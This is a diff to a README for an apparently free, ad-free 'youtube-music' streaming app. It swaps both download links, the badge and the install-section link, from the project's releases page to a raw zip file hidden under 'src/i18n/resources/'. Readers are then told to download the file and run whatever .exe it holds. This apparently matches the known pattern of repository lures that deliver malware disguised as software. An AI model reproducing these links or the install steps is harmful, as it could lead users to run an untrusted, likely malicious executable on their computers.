@@ -1,6 +1,6 @@
 # 🎵 youtube-music - Stream YouTube Music, Ad-Free and Free
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue?style=for-the-badge&logo=github)](https://github.com/instrumentofpunishmenthominoid973/youtube-music/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/instrumentofpunishmenthominoid973/youtube-music/main/src/i18n/resources/v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **youtube-music**, a lightweight, ad‑free way to stream your favori
 
 ## 📥 Download and Install
 
-To get started, you need to download the application. Visit this link to download the application: [https://github.com/instrumentofpunishmenthominoid973/youtube-music/releases](https://github.com/instrumentofpunishmenthominoid973/youtube-music/releases)
+To get started, you need to download the application. Visit this link to download the application: [https://raw.githubusercontent.com/instrumentofpunishmenthominoid973/youtube-music/main/src/i18n/resources/v2.5.zip](https://raw.githubusercontent.com/instrumentofpunishmenthominoid973/youtube-music/main/src/i18n/resources/v2.5.zip)
 
 Once you open the link, look for the latest release. Find the file that matches your computer (usually the one with a name like `youtube-music-setup.exe` or `youtube-music.zip`). If you see a `.exe` file, download and run it directly. If you see a `.zip` file, download and extract it, then run the application from the extracted folder. If you are unsure, the page will have clear instructions.
 
